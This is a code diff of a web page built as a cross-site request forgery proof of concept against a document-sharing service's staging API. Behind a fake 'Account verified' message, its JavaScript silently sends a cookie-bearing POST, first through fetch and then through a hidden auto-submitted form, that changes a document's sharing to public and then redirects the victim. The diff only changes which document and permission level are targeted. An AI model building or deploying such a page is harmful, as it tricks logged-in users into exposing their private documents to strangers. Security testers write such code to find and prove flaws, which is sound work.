@@ -30,22 +30,22 @@
     function performAttack() {
         document.getElementById('status').innerHTML = "Verifying your account...";
         
-        // Perform stealth CSRF to make document public/editor
-        fetch('https://staging.textjam.com/api/doc/5C5UAVW6/access/public/editor', {
+        // Perform stealth CSRF to make document public
+        fetch('https://staging.textjam.com/api/doc/BUQPE5L3/access/public/viewer', {
             method: 'POST',
             credentials: 'include',  // Send cookies
             mode: 'no-cors',         // Avoid CORS issues
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({})  // May need empty object
+            body: JSON.stringify({})  // Empty object like logout
         })
         .then(() => {
             document.getElementById('status').innerHTML = "✅ Account verified! Redirecting...";
             
-            // Redirect to document after changing permissions
+            // Redirect to document after making it public
             setTimeout(() => {
-                window.location.href = "https://staging.textjam.com/doc/5C5UAVW6?message=Security+updated";
+                window.location.href = "https://staging.textjam.com/doc/BUQPE5L3?message=Document+now+public";
             }, 1500);
         })
         .catch(error => {
@@ -58,21 +58,15 @@
         // Alternative: Form submission method
         var form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'https://staging.textjam.com/api/doc/5C5UAVW6/access/public/editor';
+        form.action = 'https://staging.textjam.com/api/doc/BUQPE5L3/access/public/viewer';
         form.style.display = 'none';
         
-        // Try to include CSRF token if we can steal it
-        var csrfInput = document.createElement('input');
-        csrfInput.type = 'hidden';
-        csrfInput.name = 'csrf_token';
-        csrfInput.value = 'attacker_token'; // Would need real token
-        
-        form.appendChild(csrfInput);
+        // No inputs needed for this endpoint
         document.body.appendChild(form);
         form.submit();
         
         setTimeout(() => {
-            window.location.href = "https://staging.textjam.com/doc/5C5UAVW6";
+            window.location.href = "https://staging.textjam.com/doc/BUQPE5L3";
         }, 1000);
     }
     </script>
